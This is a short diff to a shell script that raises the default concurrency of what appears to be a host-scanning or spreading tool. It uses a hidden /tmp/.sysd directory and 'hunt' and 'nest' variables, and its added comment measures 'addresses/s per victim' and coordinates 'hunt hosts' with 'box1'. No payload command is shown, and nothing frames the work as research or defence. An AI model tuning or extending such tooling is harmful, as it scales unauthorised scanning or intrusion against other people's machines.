@@ -31,8 +31,12 @@ SYSDIR="${SYSDIR:-/tmp/.sysd}"
 WORK="${HUNT_WORK:-$SELF_DIR/.hunt}"
 mkdir -p "$WORK" 2>/dev/null || :
 IMG="${NEST_IMAGE:-busybox:1.36}"
-PER="${NEST_PERSHARD:-16}"
-PAR="${NEST_PAR:-24}"
+# MEASURED on the first live round: PAR=24 moved ~3.4 addresses/s per victim, not
+# the 24 the timeout implies - so concurrency, not nc's -w, bounds the loop.
+# These defaults are what the worker.env comments were written from; keep the two
+# files in step or a hunt host that fetched one of them will disagree with box1.
+PER="${NEST_PERSHARD:-48}"
+PAR="${NEST_PAR:-96}"
 MAXH="${NEST_MAXHOSTS:-12}"
 CUR="$WORK/nest.cursor"
 URLF="$WORK/nest.url"
